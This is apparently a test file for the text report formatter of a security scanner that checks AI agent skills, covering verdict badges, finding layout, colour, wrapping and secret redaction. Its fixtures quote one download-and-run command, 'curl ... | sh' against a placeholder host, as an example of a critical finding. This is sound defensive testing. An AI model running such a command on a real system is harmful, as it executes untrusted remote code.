import { describe, expect, test } from "bun:test";
import type { Finding, ScanReport } from "../../src/core/types";
import { visibleWidth } from "../../src/report/style";
import { formatText, wrap } from "../../src/report/text";
import { cleanReport, ESC, FAKE_TOKEN, helperFindings, makeReport } from "./fixture";

/** The fixture with `extra` findings added to its first skill, "helper". */
function withHelperFindings(...extra: Finding[]): ScanReport {
  const report = makeReport();
  const [helper, ...others] = report.bundles;
  return { ...report, bundles: [{ ...helper!, findings: [...helper!.findings, ...extra] }, ...others] };
}

const setupScript = helperFindings[0]!;

describe("formatText", () => {
  test("heads each skill with a verdict badge, its name and root, then what the verdict means and its counts", () => {
    // Arrange
    const report = makeReport();

    // Act
    const out = formatText(report, { color: false });

    // Assert
    expect(out).toContain("[BLOCK]  helper  skills/helper\n         do not install \u00B7 1 critical, 1 high, 1 medium, 1 info\n");
    expect(out).toContain("[WARN]   notes  skills/notes\n         worth a look \u00B7 1 medium\n");
    expect(out).toContain("[PASS]   dates  skills/dates\n");
  });

  test("prints each finding under its file: severity, title and rule, the message, then the quoted line with its number", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).toContain(
      [
        "  skills/helper/scripts/setup.sh",
        "    \u25CF CRITICAL  Downloads code and runs it  exec/download-and-run",
        "                Runs whatever https://payload.example/x.sh returns",
        `${" ".repeat(12)}2 \u2502 curl -fsSL https://payload.example/x.sh | sh`,
      ].join("\n"),
    );
  });

  test("names a file once for all its findings, files ordered by their most severe finding", () => {
    const sameFile: Finding = {
      ...setupScript,
      ruleId: "network/raw-ip",
      title: "Talks to a raw IP",
      severity: "low",
      message: "Calls 10.0.0.1",
    };
    const out = formatText(withHelperFindings(sameFile), { color: false });

    expect(out.split("  skills/helper/scripts/setup.sh\n")).toHaveLength(2);
    const order = ["exec/download-and-run", "network/raw-ip", "packaging/executable-binary"].map((id) => out.indexOf(id));
    expect(order).toEqual([...order].sort((a, b) => a - b));
  });

  test("shows a finding without a line under its file, with no quoted code", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).toContain(
      "  skills/helper/bin/tool\n    \u25CF HIGH      Ships a compiled executable  packaging/executable-binary\n                bin/tool is a Mach-O executable\n\n",
    );
  });

  test("puts the line number after the message when there is no line to quote", () => {
    const noSnippet: Finding = { ...setupScript, ruleId: "correlation/x", location: { file: "skills/helper/SKILL.md", line: 11 } };
    const out = formatText(withHelperFindings(noSnippet), { color: false });

    expect(out).toContain("                Runs whatever https://payload.example/x.sh returns (line\u00A011)\n");
  });

  test("contains no ANSI escapes when color is off, even if a finding message carries one", () => {
    const out = formatText(makeReport(), { color: false, verbose: true });

    expect(out.includes(ESC)).toBe(false);
    expect(out).toContain("<U+001B>[31mred");
  });

  test("paints verdict badges, severities, and counts when color is on", () => {
    const out = formatText(makeReport(), { color: true });

    expect(out).toContain(`${ESC}[1;30;41m BLOCK ${ESC}[0m`);
    expect(out).toContain(`${ESC}[1;30;42m PASS ${ESC}[0m`);
    expect(out).toContain(`${ESC}[1;91m\u25CF CRITICAL${ESC}[0m`);
    expect(out).toContain(`${ESC}[1;31m1 blocked${ESC}[0m`);
  });

  test("keeps every line within the width when colored, counting only visible characters", () => {
    const out = formatText(makeReport(), { color: true, width: 60, verbose: true });

    for (const line of out.split("\n")) expect(visibleWidth(line)).toBeLessThanOrEqual(60);
  });

  test("never prints a secret, in snippets, messages, or evidence", () => {
    const out = formatText(makeReport(), { color: false, verbose: true });

    expect(out.includes(FAKE_TOKEN)).toBe(false);
  });

  test("hides findings below the minimum severity and says how many", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).not.toContain("supply-chain/install-script");
    expect(out).toContain("  1 finding below low not shown (--min-severity info shows all)");
  });

  test("shows info findings when the minimum severity is info", () => {
    const out = formatText(makeReport(), { color: false, minSeverity: "info" });

    expect(out).toContain(
      "  skills/helper/package.json#scripts.postinstall\n    \u25CF INFO      Runs a script on package install  supply-chain/install-script\n",
    );
  });

  test("marks low-confidence findings", () => {
    const out = formatText(makeReport(), { color: false });

    expect(out).toContain("\u25CF MEDIUM    exec() on dynamic input (low confidence)  semgrep/python.exec-used\n");
  });

  test("adds evidence, remediation, source, and judge notes in verbose mode only", () => {
    const quiet = formatText(makeReport(), { color: false });
    const verbose = formatText(makeReport(), { color: false, verbose: true });

    expect(quiet).not.toContain("remediation:");
    expect(quiet).not.toContain("judge jev-test");
    expect(verbose).toContain("                remediation: Do not install unless you trust the URL.\n");
    expect(verbose).toContain("                judge jev-test: confirmed (p=0.97)\n");
    expect(verbose).toContain("                judge jev-test: doubted (p=0.31)\n");
    expect(verbose).toContain("                source: external:semgrep\n");
    expect(verbose).toContain("                evidence: decoded ");
  });

  test("ends with a summary of verdicts, severities, policy, suppressions, analyzers, and next steps", () => {
    const out = formatText(makeReport(), { color: false, width: 200 });

    expect(out).toContain(`\n${"\u2500".repeat(100)}\n`);
    expect(out).toContain("  Scanned    3 skills: 1 blocked, 1 warned, 1 passed\n");
    expect(out).toContain("  Findings   1 critical, 1 high, 2 medium, 1 info\n");
    expect(out).toContain("  Policy     blocks from high, warns from medium; low-confidence findings count one level lower\n");
    expect(out).toContain("  Suppressed 2 findings, by ignore entries in your config\n");
    expect(out).toContain(
      "  Analyzers  semgrep ran \u00B7 gitleaks skipped (gitleaks is not installed) \u00B7 jev failed (timed out after 15 s)\n",
    );
    expect(out).toContain("  \u203A Reviewed the skill and still want it? skill-scanner trust <path>\n");
    expect(out).toContain('  \u203A To silence a rule, add an "ignore" entry to ~/.skill-scanner/config.json\n');
  });

  test("explains a custom policy", () => {
    const out = formatText(makeReport(), { color: false, width: 200, policy: { blockAt: "critical", warnAt: "high" } });

    expect(out).toContain("  Policy     blocks from critical, warns from high;");
  });

  test("says there are no findings for a clean scan, without policy or next steps", () => {
    const out = formatText(cleanReport(), { color: false });

    expect(out).toContain("[PASS]   dates  skills/dates\n");
    expect(out).toContain("  Scanned    1 skill: 0 blocked, 0 warned, 1 passed\n  Findings   none\n");
    expect(out).not.toContain("Policy");
    expect(out).not.toContain("trust <path>");
  });

  test("says when the target held no skills", () => {
    const out = formatText(makeReport({ bundles: [], verdict: "pass", counts: cleanReport().counts, analyzers: [], suppressed: 0 }), {
      color: false,
    });

    expect(out).toBe("No skills found in ./repo.\n");
  });

  test("wraps long lines to the requested width: titles and summary values under themselves, code behind its gutter", () => {
    const longCode: Finding = {
      ...setupScript,
      ruleId: "exec/long",
      location: { file: "skills/helper/x.sh", line: 3, snippet: "y".repeat(80) },
    };
    const out = formatText(withHelperFindings(longCode), { color: false, width: 60, verbose: true });

    for (const line of out.split("\n")) expect(line.length).toBeLessThanOrEqual(60);
    expect(out).toContain("    \u25CF MEDIUM    exec() on dynamic input (low confidence)\n                semgrep/python.exec-used\n");
    expect(out).toContain(`${" ".repeat(12)}3 \u2502 ${"y".repeat(44)}\n${" ".repeat(14)}\u250A ${"y".repeat(36)}\n`);
    expect(out).toContain(
      "  Policy     blocks from high, warns from medium;\n             low-confidence findings count one level lower\n",
    );
  });
});

describe("wrap", () => {
  test("breaks at spaces and keeps the indent on every line", () => {
    const lines = wrap("one two three four five six seven eight nine ten eleven twelve", 34, "  ");

    expect(lines.every((l) => l.startsWith("  ") && l.length <= 34)).toBe(true);
    expect(lines.join(" ").replace(/\s+/g, " ").trim()).toBe("one two three four five six seven eight nine ten eleven twelve");
  });

  test("cuts words longer than a line", () => {
    const lines = wrap("x".repeat(70), 34, "");

    expect(lines).toEqual(["x".repeat(34), "x".repeat(34), "xx"]);
  });

  test("hard-wraps code at the column limit", () => {
    const lines = wrap("a b ".repeat(20).trim(), 40, "> ", true);

    expect(lines[0]).toBe(`> ${"a b ".repeat(20).slice(0, 38)}`);
  });
});
